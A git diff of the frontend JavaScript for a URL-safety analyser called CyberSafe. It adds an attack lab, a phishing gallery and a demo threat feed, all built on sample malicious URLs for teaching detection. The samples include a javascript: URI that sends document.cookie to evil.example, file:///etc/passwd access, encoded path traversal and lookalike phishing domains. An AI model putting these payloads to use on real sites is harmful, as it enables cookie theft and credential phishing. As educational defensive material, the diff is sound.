@@ -1,7 +1,7 @@
 /**
  * CyberSafe — Frontend Application Logic v2.0
  * Modes: Offline Analysis + Safe Recon
- * CYBERSAFE 2.0: Explainable findings, visual risk score, attack lab, enhanced UX
+ * CYBERSAFE 2.0: Attack Lab, Phishing Gallery, Threat Feed, URL Compare, IOC, Badge
  */
 
 // ============================================================================
@@ -13,7 +13,7 @@ const BASE_URL = (typeof import.meta !== 'undefined' && import.meta.env && impor
 
 const API = {
   analyze: BASE_URL ? `${BASE_URL}/api/analyze` : '/api/analyze',
-  recon:   BASE_URL ? `${BASE_URL}/api/recon`   : '/api/recon',
+  badge:   BASE_URL ? `${BASE_URL}/api/badge`   : '/api/badge',
 };
 
 // ============================================================================
@@ -44,18 +44,7 @@ const confidenceText = document.getElementById('confidence-text');
 const anatomyGrid    = document.getElementById('anatomy-grid');
 const findingsList   = document.getElementById('findings-list');
 const findingsCount  = document.getElementById('findings-count');
-
-// Recon elements
-const reconResults      = document.getElementById('recon-results');
-const reconSummaryGrid  = document.getElementById('recon-summary-grid');
-const terminalView      = document.getElementById('terminal-view');
-const terminalOutput    = document.getElementById('terminal-output');
-const terminalToggleBtn = document.getElementById('terminal-toggle-btn');
-
-// Mode selector
-const modeOfflineBtn = document.getElementById('mode-offline-btn');
-const modeReconBtn   = document.getElementById('mode-recon-btn');
-const modeDescText   = document.getElementById('mode-desc-text');
+const anatomyVisual  = document.getElementById('anatomy-visual');
 
 // History
 const historyList    = document.getElementById('history-list');
@@ -67,7 +56,68 @@ const clearHistoryBtn = document.getElementById('clear-history-btn');
 // ============================================================================
 let qrScanner   = null;
 let scanHistory = [];
-let currentMode = 'offline'; // 'offline' | 'recon'
+
+// ============================================================================
+// Attack Lab Data (20 labs, 5 categories)
+// ============================================================================
+const ATTACK_LABS = [
+  // Category 1 — URL DECEPTION
+  { id: 1, category: 'DECEPTION', icon: '🎭', name: 'Credential @ Trick', desc: 'Hides real destination after @', url: 'https://google.com@evil.example/login', concept: 'Text before @ is user-information, not the hostname. The actual destination is after @.' },
+  { id: 2, category: 'DECEPTION', icon: '🎯', name: 'Brand Lookalike', desc: 'Substituted characters in brand name', url: 'https://paypa1-secure.verify.net/account', concept: 'Character substitution (1 for l) impersonates a trusted brand domain.' },
+  { id: 3, category: 'DECEPTION', icon: '🔤', name: 'Punycode Homograph', desc: 'Unicode lookalike characters', url: 'https://xn--pple-43d.com/login', concept: 'Internationalized domain names can use characters that look identical to ASCII.' },
+  { id: 4, category: 'DECEPTION', icon: '🔗', name: 'URL Shortener', desc: 'Hides destination via redirect', url: 'https://tinyurl.com/y7d3xk9p', concept: 'URL shorteners mask the true destination, common in phishing delivery.' },
+
+  // Category 2 — DANGEROUS PAYLOADS
+  { id: 5, category: 'PAYLOAD', icon: '💉', name: 'JavaScript Scheme', desc: 'Executes code in browser', url: "javascript:fetch('https://evil.example/steal?c='+document.cookie)", concept: 'The javascript: scheme runs code directly in the browser context.' },
+  { id: 6, category: 'PAYLOAD', icon: '📦', name: 'Data URI', desc: 'Embeds HTML payload in URL', url: "data:text/html,<h1>Phishing Page</h1>", concept: 'Data URIs embed inline content, bypassing domain reputation checks.' },
+  { id: 7, category: 'PAYLOAD', icon: '📂', name: 'File Scheme', desc: 'Accesses local filesystem', url: 'file:///etc/passwd', concept: 'The file: scheme attempts to access the local device filesystem.' },
+  { id: 8, category: 'PAYLOAD', icon: '🔐', name: 'Encoded Payload', desc: 'Percent-encoded obfuscation', url: 'https://example.com/%2F%2F..%2F..%2Fetc%2Fpasswd%2F%2F%2F', concept: 'Excessive percent-encoding hides the true path from security filters.' },
+
+  // Category 3 — HOST & NETWORK
+  { id: 9, category: 'NETWORK', icon: '🌐', name: 'Public IP Address', desc: 'Raw IP instead of domain', url: 'http://93.184.216.34/login', concept: 'Legitimate sites use domain names. Raw IPs bypass reputation systems.' },
+  { id: 10, category: 'NETWORK', icon: '🏠', name: 'Private/Internal IP', desc: 'Targets private network', url: 'http://10.0.0.1/admin/config.php', concept: 'Private IPs (10.x, 192.168.x) target internal network resources.' },
+  { id: 11, category: 'NETWORK', icon: '🔌', name: 'Suspicious Port', desc: 'Non-standard port number', url: 'https://example.com:8443/login', concept: 'Non-standard ports (8443, 8080) may indicate unofficial services.' },
+  { id: 12, category: 'NETWORK', icon: '🔢', name: 'Obfuscated IP', desc: 'DWORD integer IP encoding', url: 'http://2130706433/admin', concept: 'Integer/hex IP encoding hides the destination from basic URL checks.' },
+
+  // Category 4 — PHISHING PATTERNS
+  { id: 13, category: 'PHISHING', icon: '🔑', name: 'Fake Login Path', desc: 'Credential harvest path', url: 'https://example-secure.com/login', concept: 'Paths like /login on unfamiliar domains may be credential harvesting pages.' },
+  { id: 14, category: 'PHISHING', icon: '🪝', name: 'Credential Collection', desc: 'Password reset lure', url: 'https://accounts-verify.net/reset-password?token=abc123', concept: 'Fake password reset pages combined with brand impersonation capture credentials.' },
+  { id: 15, category: 'PHISHING', icon: '✉️', name: 'Account Verification', desc: 'Email verify lure', url: 'https://verify-account.tk/email-confirm?user=victim', concept: 'Fake verification pages on suspicious TLDs (.tk) are common phishing vectors.' },
+  { id: 16, category: 'PHISHING', icon: '💳', name: 'Suspicious Payment', desc: 'Billing/payment lure', url: 'https://paypal-billing.verify.net/payment', concept: 'Brand names in non-official domains with payment paths indicate phishing.' },
+
+  // Category 5 — URL STRUCTURE
+  { id: 17, category: 'STRUCTURE', icon: '📏', name: 'Excessively Long URL', desc: 'Obfuscation via length', url: 'https://legitimate-looking-site.com/page/that/goes/on/and/on/for/no/good/reason/whatsoever/because/attackers/use/long/paths/to/confuse/security/filters/and/hide/malicious/content/deep/within/the/url/structure/making/it/very/hard/to/read/or/verify/by/humans/or/simple/automated/tools/that/only/check/the/domain/name/and/not/the/full/path', concept: 'Extremely long URLs can hide malicious destinations from cursory inspection.' },
+  { id: 18, category: 'STRUCTURE', icon: '🪆', name: 'Nested URL', desc: 'URL within query param', url: 'https://example.com/redirect?url=https://evil.example/phish', concept: 'URLs embedded in query parameters can redirect to malicious destinations.' },
+  { id: 19, category: 'STRUCTURE', icon: '❓', name: 'Suspicious Query', desc: 'Redirect parameter abuse', url: 'https://accounts.google.com.evil.example/signin?continue=https://phish.example', concept: 'Redirect parameters combined with brand lookalikes create convincing phishing.' },
+  { id: 20, category: 'STRUCTURE', icon: '@@', name: 'Multiple @ Symbols', desc: 'Multiple @ confusion', url: 'https://user@attacker.com@evil.example/login', concept: 'Multiple @ symbols confuse URL parsers. The real host follows the last @.' },
+];
+
+// ============================================================================
+// Phishing Gallery Data
+// ============================================================================
+const PHISHING_GALLERY = [
+  { technique: 'Deceptive @', example: 'https://paypal.com@evil.example/login', userSees: '"paypal.com" appears in the browser bar', actualContent: 'Destination is evil.example, not paypal.com', whyMatters: 'Browsers treat text before @ as credentials, not as the hostname.', detection: 'AT_SYMBOL_DECEPTION rule detects user-information in URL', howToStay: 'Always check the actual hostname after the @ symbol. Look at the browser\'s address bar carefully.' },
+  { technique: 'Lookalike Domain', example: 'https://paypa1.com/signin', userSees: '"paypa1" looks almost identical to "paypal"', actualContent: 'Character "1" replaces "l" — this is a different domain', whyMatters: 'Character substitution is the most common domain impersonation technique.', detection: 'LOOKALIKE_HOSTNAME detects character substitution patterns', howToStay: 'Type the official URL directly. Do not click links from emails or messages.' },
+  { technique: 'Punycode Homograph', example: 'https://xn--pple-43d.com', userSees: 'May appear as "apple.com" in some browsers', actualContent: 'Uses internationalized characters encoded as Punycode (xn--)', whyMatters: 'Characters from other alphabets can look identical to Latin letters.', detection: 'PUNYCODE_HOSTNAME flags IDN-encoded hostnames', howToStay: 'Check for "xn--" in URLs. Modern browsers show Punycode for mixed-script domains.' },
+  { technique: 'Shortened URL', example: 'https://bit.ly/3xYzAbC', userSees: 'A short bit.ly link', actualContent: 'The real destination is hidden behind the redirect', whyMatters: 'URL shorteners are commonly abused to hide phishing destinations.', detection: 'KNOWN_URL_SHORTENER identifies shortening services', howToStay: 'Use a URL expander tool before clicking. Avoid shortened links from unknown sources.' },
+  { technique: 'IP Address URL', example: 'http://93.184.216.34/banking', userSees: 'A raw IP address instead of a domain name', actualContent: 'No domain name means no SSL verification of identity', whyMatters: 'Legitimate banking and financial sites always use domain names, never raw IPs.', detection: 'IP_ADDRESS_HOST flags direct IP address usage', howToStay: 'Never enter credentials on a site identified only by its IP address.' },
+  { technique: 'Fake Login', example: 'https://secure-login.example.com/google/signin', userSees: 'Path contains "google" and "signin" — looks legitimate', actualContent: 'Domain is example.com, not google.com', whyMatters: 'Attackers put brand names in paths and subdomains to create trust.', detection: 'CREDENTIAL_PATH + domain mismatch detection', howToStay: 'Always verify the root domain matches the service you expect.' },
+  { technique: 'Suspicious Payment', example: 'https://paypal-payment.verify.net/billing', userSees: '"paypal" appears in the subdomain', actualContent: 'Domain is verify.net, not paypal.com', whyMatters: 'Payment page phishing targets financial credentials and card details.', detection: 'BRAND_IN_NON_OFFICIAL_DOMAIN + PAYMENT_PATH', howToStay: 'Navigate to payment sites directly by typing their URL. Never follow email links.' },
+  { technique: 'Dangerous Scheme', example: "javascript:document.location='https://evil.example'", userSees: 'May appear as a clickable link', actualContent: 'Executes JavaScript code in the browser on click', whyMatters: 'JavaScript URIs can steal cookies, redirect, or modify page content.', detection: 'DANGEROUS_SCHEME flags javascript:, data:, vbscript:', howToStay: 'Never click or paste javascript: URIs. They execute code, not navigate.' },
+  { technique: 'Encoded URL', example: 'https://example.com/%68%74%74%70%73%3A%2F%2Fevil.example', userSees: 'A URL with percent-encoded characters', actualContent: 'Decodes to a redirect or nested malicious URL', whyMatters: 'Encoding hides the true nature of URL components from inspection.', detection: 'EXCESSIVE_ENCODING detects high percent-encoding count', howToStay: 'Be wary of URLs with excessive %XX sequences. Decode before trusting.' },
+  { technique: 'Suspicious Port', example: 'https://google.com:8080/account', userSees: 'google.com with an unusual port number', actualContent: 'Port 8080 is not the standard HTTPS port (443)', whyMatters: 'Non-standard ports might host unofficial or malicious services.', detection: 'UNUSUAL_PORT flags non-standard port numbers', howToStay: 'Legitimate major services use standard ports (80/443). Question unusual ports.' },
+];
+
+// ============================================================================
+// Demo Threat Feed Data
+// ============================================================================
+const DEMO_THREATS = [
+  { type: 'PHISHING', indicator: 'paypa1-secure.verify.net', severity: 'HIGH', source: 'DEMO', category: 'Lookalike Domain', timestamp: '2026-10-03T08:22:00Z' },
+  { type: 'MALWARE', indicator: "javascript:eval(atob('...'))", severity: 'CRITICAL', source: 'DEMO', category: 'JavaScript Injection', timestamp: '2026-10-03T07:15:00Z' },
+  { type: 'SCAM', indicator: 'bit.ly/urgent-account-verify', severity: 'MEDIUM', source: 'DEMO', category: 'URL Shortener', timestamp: '2026-10-03T06:45:00Z' },
+  { type: 'SUSPICIOUS', indicator: '93.184.216.34/login', severity: 'MEDIUM', source: 'DEMO', category: 'IP Address Host', timestamp: '2026-10-03T05:30:00Z' },
+  { type: 'PHISHING', indicator: 'google.com@evil-domain.net/signin', severity: 'HIGH', source: 'DEMO', category: 'Deceptive @', timestamp: '2026-10-03T04:12:00Z' },
+];
 
 // ============================================================================
 // Initialization
@@ -87,7 +137,7 @@ document.addEventListener('DOMContentLoaded', () => {
   modeOfflineBtn.addEventListener('click', () => setMode('offline'));
   modeReconBtn.addEventListener('click',   () => setMode('recon'));
 
-  // Safe Recon button (separate from form submission)
+  // Safe Recon button
   const reconBtn = document.getElementById('recon-btn');
   if (reconBtn) {
     reconBtn.addEventListener('click', () => {
@@ -100,23 +150,6 @@ document.addEventListener('DOMContentLoaded', () => {
       handleRecon(url).finally(() => hideLoading());
     });
   }
-
-  // Demo buttons — Phase 9: Attack Lab — auto-analyze on click
-  document.querySelectorAll('.demo-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-      const url = btn.getAttribute('data-url');
-      urlInput.value = url;
-      urlInput.focus();
-      // Auto-trigger analysis for attack lab demo buttons
-      if (btn.closest('.attack-lab-demos')) {
-        setMode('offline');
-        hideError();
-        hideResults();
-        showLoading('Analyzing URL structure...');
-        handleAnalyze(url).catch(err => showError('Analysis Failed', err.message)).finally(() => hideLoading());
-      }
-    });
-  });
 
   // Recon tab navigation
   document.querySelectorAll('.recon-tab-btn').forEach(btn => {
@@ -145,12 +178,65 @@ document.addEventListener('DOMContentLoaded', () => {
     exportBtn.addEventListener('click', exportReport);
   }
 
-  // History search
+  // History search (sidebar)
   const historySearch = document.getElementById('history-search');
   if (historySearch) {
     historySearch.addEventListener('input', () => renderHistory(historySearch.value.trim()));
   }
+
+  // ======== NEW FEATURE INIT ========
+
+  // Tab Navigation
+  initTabNavigation();
+
+  // Attack Lab
+  initAttackLab();
+
+  // Phishing Gallery
+  initPhishingGallery();
+
+  // Threat Feed
+  initThreatFeed();
+
+  // URL Comparison
+  initURLComparison();
+
+  // IOC Extraction
+  initIOC();
+
+  // Badge
+  initBadge();
+
+  // Full History Tab
+  initFullHistory();
 });
+
+// ============================================================================
+// Tab Navigation
+// ============================================================================
+function initTabNavigation() {
+  document.querySelectorAll('.nav-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      const target = tab.getAttribute('data-tab');
+
+      // Update active tab
+      document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+
+      // Show correct panel
+      document.querySelectorAll('.tab-panel').forEach(panel => panel.classList.remove('active'));
+      const targetPanel = document.getElementById(`${target}-tab`);
+      if (targetPanel) targetPanel.classList.add('active');
+
+      if (typeof lucide !== 'undefined') lucide.createIcons();
+    });
+  });
+}
+
+function switchToTab(tabId) {
+  const tab = document.querySelector(`.nav-tab[data-tab="${tabId}"]`);
+  if (tab) tab.click();
+}
 
 // ============================================================================
 // Mode Management
@@ -181,7 +267,6 @@ async function handleFormSubmit(e) {
 
   hideError();
   hideResults();
-  // Phase 3: Fix loading text
   showLoading(currentMode === 'recon'
     ? 'Performing safe reconnaissance...'
     : 'Analyzing URL structure...');
@@ -199,7 +284,6 @@ async function handleFormSubmit(e) {
   }
 }
 
-// Phase 16: Readable error messages
 function getReadableError(err) {
   const msg = err.message || '';
   if (msg.includes('Failed to fetch') || msg.includes('NetworkError')) {
@@ -239,6 +323,7 @@ async function handleAnalyze(url) {
   });
   renderAnalysisResults(data.analysis);
   showResults('offline');
+  renderIOC(data.analysis);
 }
 
 // ============================================================================
@@ -274,10 +359,6 @@ async function handleRecon(url) {
 // ============================================================================
 // Render — Offline Analysis
 // ============================================================================
-
-// Phase 5: Score contribution weights by severity
-const SEVERITY_SCORE = { critical: 40, high: 25, medium: 15, low: 8, info: 2 };
-
 function renderAnalysisResults(analysis) {
   const v = analysis.verdict;
   verdictBanner.className = `verdict-banner ${v}`;
@@ -293,7 +374,7 @@ function renderAnalysisResults(analysis) {
   renderFindings(analysis.findings || [], analysis.score);
   renderRiskScoreBar(analysis.score, analysis.findings || []);
 
-  // Phase 12: store last analysis for export
+  // Store last analysis for export and IOC
   window._lastAnalysis = analysis;
 
   // Show export button
@@ -303,7 +384,7 @@ function renderAnalysisResults(analysis) {
   if (typeof lucide !== 'undefined') lucide.createIcons();
 }
 
-// Phase 4: Interactive URL Anatomy with visual highlights
+// URL Anatomy with visual highlights
 function renderAnatomy(analysis) {
   const p = analysis.parsed || {};
 
@@ -331,7 +412,7 @@ function renderAnatomy(analysis) {
     </div>`).join('');
 }
 
-// Phase 4: Build visual URL breakdown
+// Build visual URL breakdown
 function buildURLVisual(analysis) {
   const p = analysis.parsed || {};
   const url = p.original_url || '';
@@ -374,19 +455,13 @@ function buildURLVisual(analysis) {
   </div>`;
 }
 
-// Phase 5: Visual risk score bar with per-finding breakdown
+// Risk score bar — uses ACTUAL finding scores from API
 function renderRiskScoreBar(score, findings) {
   const container = document.getElementById('risk-score-breakdown');
   if (!container) return;
 
   const pct = Math.min(100, score);
   const colorClass = score >= 50 ? 'bar--suspicious' : score >= 20 ? 'bar--review' : 'bar--safe';
-
-  // Per-finding score contributions
-  const contributions = findings.map(f => {
-    const contrib = SEVERITY_SCORE[f.severity] || 5;
-    return { title: f.title, severity: f.severity, contrib };
-  });
 
   container.innerHTML = `
     <div class="risk-score-header">
@@ -396,74 +471,34 @@ function renderRiskScoreBar(score, findings) {
     <div class="risk-bar-track">
       <div class="risk-bar-fill ${colorClass}" style="width:${pct}%"></div>
     </div>
-    ${contributions.length ? `
+    ${findings.length ? `
     <div class="risk-contributions">
-      <div class="risk-contrib-title">Score contributors:</div>
-      ${contributions.map(c => `
+      <div class="risk-contrib-title">Score breakdown:</div>
+      ${findings.map(f => `
         <div class="risk-contrib-row">
-          <span class="risk-contrib-name">${escapeHTML(c.title)}</span>
-          <span class="risk-contrib-badge severity-badge ${escapeHTML(c.severity)}">${escapeHTML(c.severity)}</span>
-          <span class="risk-contrib-pts font-mono">+${c.contrib}</span>
+          <span class="risk-contrib-name">${escapeHTML(f.title || f.rule_id)}</span>
+          <span class="risk-contrib-badge severity-badge ${escapeHTML(f.severity)}">${escapeHTML(f.severity)}</span>
+          <span class="risk-contrib-pts font-mono">+${f.score}</span>
         </div>`).join('')}
     </div>` : ''}`;
 }
 
-// Phase 6: Explainable findings with WHAT/WHY/ACTION
+// Explainable findings with WHAT/WHY/ACTION
 const FINDING_EXPLANATIONS = {
-  // Lookalike / brand impersonation
-  'brand_impersonation': {
-    what: 'The hostname closely resembles a trusted brand but is a different domain.',
-    why: 'Attackers register look-alike domains (e.g., paypa1.com, google-secure.net) to steal credentials.',
-    action: 'Do not enter credentials. Navigate directly to the official site by typing it yourself.',
-  },
-  // Deceptive @
-  'userinfo_deception': {
-    what: 'A "@" symbol appears in the URL before the actual hostname.',
-    why: 'Everything before "@" is treated as credentials by browsers. The real destination is after "@".',
-    action: 'The visual hostname is fake. The actual destination follows the "@" symbol.',
-  },
-  // IP address as host
-  'ip_address_host': {
-    what: 'The URL uses a raw IP address instead of a domain name.',
-    why: 'Legitimate services rarely use bare IPs. This can mask the true identity of the server.',
-    action: 'Exercise caution. Verify you trust this IP address before proceeding.',
-  },
-  // URL shortener
-  'url_shortener': {
-    what: 'This URL uses a known link-shortening service that hides the real destination.',
-    why: 'Shortened URLs are commonly used in phishing to conceal malicious destinations.',
-    action: 'Expand the link first using a URL expander tool, or avoid clicking if the source is untrusted.',
-  },
-  // Dangerous scheme
-  'dangerous_scheme': {
-    what: 'The URL uses a non-standard scheme (e.g., javascript:, data:, vbscript:).',
-    why: 'These schemes can execute code directly in the browser when clicked.',
-    action: 'Never click or paste this URL into a browser address bar.',
-  },
-  // Punycode
-  'punycode_hostname': {
-    what: 'The hostname contains internationalized characters encoded as punycode (xn--).',
-    why: 'Homograph attacks use characters from other alphabets that look identical to Latin letters.',
-    action: 'Verify the actual Unicode characters in the hostname match the expected site.',
-  },
-  // Suspicious patterns
-  'suspicious_path': {
-    what: 'The URL path contains patterns commonly associated with phishing pages.',
-    why: 'Paths like /login, /verify, /secure are frequently used in credential-harvesting pages.',
-    action: 'Verify the domain is legitimate before entering any information.',
-  },
+  'brand_impersonation': { what: 'The hostname closely resembles a trusted brand but is a different domain.', why: 'Attackers register look-alike domains to steal credentials.', action: 'Do not enter credentials. Navigate directly to the official site.' },
+  'userinfo_deception': { what: 'A "@" symbol appears in the URL before the actual hostname.', why: 'Everything before "@" is treated as credentials by browsers. The real destination is after "@".', action: 'The visual hostname is fake. The actual destination follows the "@" symbol.' },
+  'ip_address_host': { what: 'The URL uses a raw IP address instead of a domain name.', why: 'Legitimate services rarely use bare IPs. This can mask the true identity of the server.', action: 'Exercise caution. Verify you trust this IP address before proceeding.' },
+  'url_shortener': { what: 'This URL uses a known link-shortening service that hides the real destination.', why: 'Shortened URLs are commonly used in phishing to conceal malicious destinations.', action: 'Expand the link first using a URL expander tool.' },
+  'dangerous_scheme': { what: 'The URL uses a non-standard scheme (e.g., javascript:, data:).', why: 'These schemes can execute code directly in the browser when clicked.', action: 'Never click or paste this URL into a browser address bar.' },
+  'punycode_hostname': { what: 'The hostname contains internationalized characters encoded as punycode.', why: 'Homograph attacks use characters from other alphabets that look identical to Latin letters.', action: 'Verify the actual Unicode characters in the hostname.' },
+  'suspicious_path': { what: 'The URL path contains patterns commonly associated with phishing pages.', why: 'Paths like /login, /verify are frequently used in credential-harvesting pages.', action: 'Verify the domain is legitimate before entering any information.' },
 };
 
 function getFindingExplanation(finding) {
-  // Match by rule_id or by key words in the title
-  if (finding.rule_id && FINDING_EXPLANATIONS[finding.rule_id]) {
-    return FINDING_EXPLANATIONS[finding.rule_id];
-  }
+  if (finding.rule_id && FINDING_EXPLANATIONS[finding.rule_id]) return FINDING_EXPLANATIONS[finding.rule_id];
   const titleLower = (finding.title || '').toLowerCase();
   for (const [key, exp] of Object.entries(FINDING_EXPLANATIONS)) {
-    if (titleLower.includes(key.replace(/_/g, ' ').split(' ')[0])) {
-      return exp;
-    }
+    if (titleLower.includes(key.replace(/_/g, ' ').split(' ')[0])) return exp;
   }
   return null;
 }
@@ -513,231 +548,80 @@ function renderFindings(findings, totalScore) {
   if (typeof lucide !== 'undefined') lucide.createIcons();
 }
 
-// Phase 6: Toggle finding explanation
 function toggleFindingExpand(btn, id) {
   const panel = document.getElementById(id);
   if (!panel) return;
   const expanded = btn.getAttribute('aria-expanded') === 'true';
   btn.setAttribute('aria-expanded', String(!expanded));
   panel.classList.toggle('hidden', expanded);
-  btn.querySelector('span') && (btn.querySelector('span').textContent = expanded ? 'Explain this finding' : 'Hide explanation');
   const icon = btn.querySelector('svg, i[data-lucide]');
   if (icon) {
     icon.setAttribute('data-lucide', expanded ? 'chevron-down' : 'chevron-up');
     if (typeof lucide !== 'undefined') lucide.createIcons();
   }
 }
-// Expose for inline onclick
 window.toggleFindingExpand = toggleFindingExpand;
 
 // ============================================================================
-// Render — Safe Recon
+// Render — Safe Recon (preserved from original)
 // ============================================================================
 function renderReconResults(recon) {
-  const risk    = recon.risk    || {};
-  const http    = recon.http    || {};
-  const tls     = recon.tls     || {};
-  const target  = recon.target  || {};
-  const headers = recon.headers || {};
+  const risk = recon.risk || {}; const http = recon.http || {}; const tls = recon.tls || {};
+  const target = recon.target || {}; const headers = recon.headers || {};
 
   const level = risk.level || 'UNKNOWN';
   const levelClass = { LOW: 'SAFE', MEDIUM: 'REVIEW', HIGH: 'SUSPICIOUS', CRITICAL: 'SUSPICIOUS' }[level] || 'REVIEW';
   verdictBanner.className = `verdict-banner ${levelClass}`;
   verdictTitle.textContent = `RECON: ${level} RISK`;
-  verdictRecommendation.textContent = risk.indicators?.length
-    ? risk.indicators.join(' · ')
-    : 'No critical indicators detected from public metadata.';
-  scoreText.textContent    = `${risk.score || 0}/100`;
+  verdictRecommendation.textContent = risk.indicators?.length ? risk.indicators.join(' · ') : 'No critical indicators detected from public metadata.';
+  scoreText.textContent = `${risk.score || 0}/100`;
   confidenceText.textContent = 'RECON';
-  verdictIcon.innerHTML    = `<i data-lucide="radar"></i>`;
+  verdictIcon.innerHTML = `<i data-lucide="radar"></i>`;
   if (typeof lucide !== 'undefined') lucide.createIcons();
 
   reconSummaryGrid.innerHTML = [
-    { label: 'HTTPS',    value: tls.enabled ? '✓ Enabled'  : '✗ Not enabled',  ok: tls.enabled },
-    { label: 'TLS',      value: tls.expired === false ? '✓ Valid' : tls.expired ? '✗ Expired' : tls.enabled ? '? Unknown' : '— N/A', ok: !tls.expired && tls.enabled },
-    { label: 'HTTP',     value: http.status_code ? `${http.status_code}` : '— N/A', ok: http.status_code >= 200 && http.status_code < 400 },
-    { label: 'Redirects',value: http.redirect_count > 1 ? `⚠ ${http.redirect_count}` : `✓ ${http.redirect_count || 0}`, ok: (http.redirect_count || 0) <= 1 },
+    { label: 'HTTPS', value: tls.enabled ? '✓ Enabled' : '✗ Not enabled', ok: tls.enabled },
+    { label: 'TLS', value: tls.expired === false ? '✓ Valid' : tls.expired ? '✗ Expired' : tls.enabled ? '? Unknown' : '— N/A', ok: !tls.expired && tls.enabled },
+    { label: 'HTTP', value: http.status_code ? `${http.status_code}` : '— N/A', ok: http.status_code >= 200 && http.status_code < 400 },
+    { label: 'Redirects', value: http.redirect_count > 1 ? `⚠ ${http.redirect_count}` : `✓ ${http.redirect_count || 0}`, ok: (http.redirect_count || 0) <= 1 },
     { label: 'Sec Headers', value: (() => { const missing = Object.values(headers).filter(h => !h.present).length; return missing ? `⚠ ${missing} missing` : '✓ All present'; })(), ok: Object.values(headers).every(h => h.present) },
-    { label: 'DNS',      value: recon.dns?.A?.length ? '✓ Resolved' : '? No A record', ok: (recon.dns?.A?.length || 0) > 0 },
+    { label: 'DNS', value: recon.dns?.A?.length ? '✓ Resolved' : '? No A record', ok: (recon.dns?.A?.length || 0) > 0 },
   ].map(s => `
     <div class="recon-summary-item ${s.ok ? 'ok' : 'warn'}">
       <span class="recon-summary-label">${escapeHTML(s.label)}</span>
       <span class="recon-summary-value">${escapeHTML(s.value)}</span>
     </div>`).join('');
 
-  if (terminalOutput) {
-    terminalOutput.textContent = buildTerminalOutput(recon);
-  }
-
-  renderReconTabDNS(recon.dns || {});
-  renderReconTabHTTP(http);
-  renderReconTabTLS(tls);
-  renderReconTabHeaders(headers);
-  renderReconTabCookies(recon.cookies || []);
-  renderReconTabTech(recon.technology || {});
+  if (terminalOutput) terminalOutput.textContent = buildTerminalOutput(recon);
+  renderReconTabDNS(recon.dns || {}); renderReconTabHTTP(http); renderReconTabTLS(tls);
+  renderReconTabHeaders(headers); renderReconTabCookies(recon.cookies || []); renderReconTabTech(recon.technology || {});
 }
 
-function renderReconTabDNS(dns) {
-  const panel = document.getElementById('recon-tab-dns');
-  if (!panel) return;
-  const types = ['A','AAAA','CNAME','MX','NS','TXT'];
-  panel.innerHTML = types.map(t => {
-    const records = dns[t] || [];
-    return `<div class="recon-record-group">
-      <div class="recon-record-type">${t}</div>
-      ${records.length === 0
-        ? `<div class="recon-record-empty">No records</div>`
-        : records.map(r => `<div class="recon-record-value font-mono">${escapeHTML(r.value || r.error || '')}${r.ttl ? `<span class="recon-ttl"> TTL ${r.ttl}s</span>` : ''}</div>`).join('')
-      }
-    </div>`;
-  }).join('');
-}
+function renderReconTabDNS(dns) { const panel = document.getElementById('recon-tab-dns'); if (!panel) return; const types = ['A','AAAA','CNAME','MX','NS','TXT']; panel.innerHTML = types.map(t => { const records = dns[t] || []; return `<div class="recon-record-group"><div class="recon-record-type">${t}</div>${records.length === 0 ? `<div class="recon-record-empty">No records</div>` : records.map(r => `<div class="recon-record-value font-mono">${escapeHTML(r.value || r.error || '')}${r.ttl ? `<span class="recon-ttl"> TTL ${r.ttl}s</span>` : ''}</div>`).join('')}</div>`; }).join(''); }
+function renderReconTabHTTP(http) { const panel = document.getElementById('recon-tab-http'); if (!panel) return; const rows = [['Status', http.status_code || '—'],['Final URL', http.final_url || '—'],['Redirects', http.redirect_count ?? '—'],['Content-Type', http.content_type || '—'],['Server', http.server || '—'],['Error', http.error || 'None']]; let html = `<table class="recon-table">${rows.map(([k,v]) => `<tr><td class="recon-table-key">${escapeHTML(k)}</td><td class="recon-table-val font-mono">${escapeHTML(String(v))}</td></tr>`).join('')}</table>`; if (http.redirects?.length > 1) { html += `<div class="recon-redirect-chain"><div class="recon-section-title">Redirect Chain</div>`; http.redirects.forEach((r, i) => { html += `<div class="recon-redirect-hop"><span class="recon-hop-num">${i+1}</span><span class="recon-hop-url font-mono">${escapeHTML(r.url)}</span><span class="recon-hop-status">${r.status}</span></div>`; }); html += `</div>`; } panel.innerHTML = html; }
+function renderReconTabTLS(tls) { const panel = document.getElementById('recon-tab-tls'); if (!panel) return; if (!tls.enabled) { panel.innerHTML = `<div class="recon-warning">⚠ TLS not enabled or could not be retrieved.<br>${escapeHTML(tls.error || tls.reason || '')}</div>`; return; } const rows = [['Enabled','Yes'],['Version',tls.version||'—'],['Subject',tls.subject||'—'],['Issuer',tls.issuer||'—'],['Valid From',tls.valid_from||'—'],['Valid Until',tls.valid_until||'—'],['Expired',tls.expired===true?'⚠ Yes':tls.expired===false?'✓ No':'?'],['Days Remaining',tls.days_remaining!=null?`${tls.days_remaining} days`:'—'],['Hostname Matches',tls.hostname_matches===true?'✓ Yes':tls.hostname_matches===false?'✗ No':'?']]; panel.innerHTML = `<table class="recon-table">${rows.map(([k,v]) => `<tr><td class="recon-table-key">${escapeHTML(k)}</td><td class="recon-table-val font-mono">${escapeHTML(String(v))}</td></tr>`).join('')}</table>`; }
+function renderReconTabHeaders(headers) { const panel = document.getElementById('recon-tab-headers'); if (!panel) return; panel.innerHTML = Object.entries(headers).map(([name, info]) => `<div class="recon-header-row ${info.present ? 'present' : 'missing'}"><div class="recon-header-name"><span class="recon-header-status">${info.present ? '✓' : '✗'}</span>${escapeHTML(name)}</div>${info.present && info.value ? `<div class="recon-header-value font-mono">${escapeHTML(info.value)}</div>` : ''}<div class="recon-header-desc">${escapeHTML(info.description || '')}</div></div>`).join(''); }
+function renderReconTabCookies(cookies) { const panel = document.getElementById('recon-tab-cookies'); if (!panel) return; if (!cookies.length) { panel.innerHTML = `<div class="recon-empty">No cookies found.</div>`; return; } panel.innerHTML = cookies.map(c => `<div class="recon-cookie-card"><div class="recon-cookie-name font-mono">${escapeHTML(c.name)}</div><div class="recon-cookie-flags"><span class="cookie-flag ${c.secure?'ok':'warn'}">Secure: ${c.secure?'✓':'✗'}</span><span class="cookie-flag ${c.http_only?'ok':'warn'}">HttpOnly: ${c.http_only?'✓':'✗'}</span><span class="cookie-flag ${c.same_site?'ok':'warn'}">SameSite: ${c.same_site?escapeHTML(c.same_site):'✗'}</span></div>${c.warnings.length?`<div class="recon-cookie-warnings">${c.warnings.map(w => `<div class="recon-warning-item">⚠ ${escapeHTML(w)}</div>`).join('')}</div>`:''}</div>`).join(''); }
